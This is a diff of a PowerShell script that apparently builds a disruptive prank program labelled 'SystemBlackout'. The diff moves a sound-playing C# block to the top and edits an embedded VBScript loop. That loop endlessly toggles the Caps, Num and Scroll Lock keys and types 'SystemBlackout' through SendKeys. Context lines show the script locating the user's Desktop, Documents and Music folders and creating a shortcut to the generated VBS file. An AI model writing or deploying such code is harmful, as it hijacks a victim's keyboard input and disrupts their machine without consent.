@@ -1,3 +1,31 @@
+# Import the required .NET assemblies
+Add-Type -TypeDefinition @'
+using System;
+using System.Media;
+
+public class ByteBeatPlayer
+{
+    public static void PlayByteBeat(byte[] bytes)
+    {
+        using (var ms = new System.IO.MemoryStream(bytes))
+        {
+            using (var player = new SoundPlayer(ms))
+            {
+                player.PlaySync();
+            }
+        }
+    }
+}
+'@
+
+# Define your byte beat pattern as an array of bytes
+$byteBeatPattern = @(0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45, 0x66, 0x6D, 0x74, 0x20,
+                    0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x44, 0xAC, 0x00, 0x00, 0x10, 0xB1, 0x02, 0x00,
+                    0x04, 0x00, 0x10, 0x00, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00)
+
+# Call the PlayByteBeat method to play the byte beat
+[ByteBeatPlayer]::PlayByteBeat($byteBeatPattern)
+
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $musicPath = [Environment]::GetFolderPath("MyMusic")
@@ -55,7 +83,7 @@ Do
     WScript.Sleep 100
     x.SendKeys "{CAPSLOCK}"
     x.SendKeys "{NUMLOCK}"
-    x.SendKeys "【S】【y】【s】【t】【e】【m】【B】【l】【a】【c】【k】【o】【u】【t】"
+    x.SendKeys "S                    y                    s                    t                    e                    m                    B                    l                    a                    c                    k                    o                    u                    t                    "
     x.SendKeys "{SCROLLLOCK}"
 Loop
 "@
@@ -156,34 +184,6 @@ $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($shortcutPath)
 $shortcut.TargetPath = $vbsFilePath
 $shortcut.Save()
-
-# Import the required .NET assembly
-Add-Type -TypeDefinition @'
-using System;
-using System.Media;
-
-public class ByteBeatPlayer
-{
-    public static void PlayByteBeat(byte[] bytes)
-    {
-        using (var ms = new System.IO.MemoryStream(bytes))
-        {
-            using (var player = new SoundPlayer(ms))
-            {
-                player.PlaySync();
-            }
-        }
-    }
-}
-'@
-
-# Define your byte beat pattern as an array of bytes
-$byteBeatPattern = @(0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45, 0x66, 0x6D, 0x74, 0x20,
-                    0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x44, 0xAC, 0x00, 0x00, 0x10, 0xB1, 0x02, 0x00,
-                    0x04, 0x00, 0x10, 0x00, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00)
-
-# Call the PlayByteBeat method to play the byte beat
-[ByteBeatPlayer]::PlayByteBeat($byteBeatPattern)
 
 $source = @"
 using System;
